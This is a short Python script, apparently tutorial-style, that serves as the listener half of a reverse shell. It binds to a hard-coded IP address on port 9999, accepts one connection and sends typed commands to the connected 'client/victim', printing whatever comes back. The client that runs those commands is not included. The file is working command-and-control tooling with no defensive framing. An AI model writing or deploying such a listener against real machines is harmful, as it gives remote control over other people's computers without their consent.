import socket
import sys

#0-2^16-1 port range

#Create a Socket ( connect two computers)
def create_socket():
    
    try:        
        global host
        global port
        global skt
        
        host = "138.68.68.65"
        port = 9999
        
        skt=socket.socket()
    
    except socket.error as msg:
        
        print("Socket creation error: ",str(msg))
        
# Binding the socket and listening for connections        
def socket_bind_and_listen():
    
    try:
        global host
        global port
        global skt 
        
        skt.bind((host,port))
        skt.listen()
        
    except socket.error as msg:
        print("Socket binding error: ", str(msg))
        socket_bind_and_listen()
        
# Establish connection with a client (socket must be listening)         
def socket_accept_connection():
    conn,address = skt.accept()
    
    print("Client IP   :  ",address[0])
    print("Client Port:  ",address[1])
    
    send_commands(conn)
    conn.close()
    
# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            skt.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")
     
    
def main():
    create_socket()
    socket_bind_and_listen()
    socket_accept_connection()
    
main()
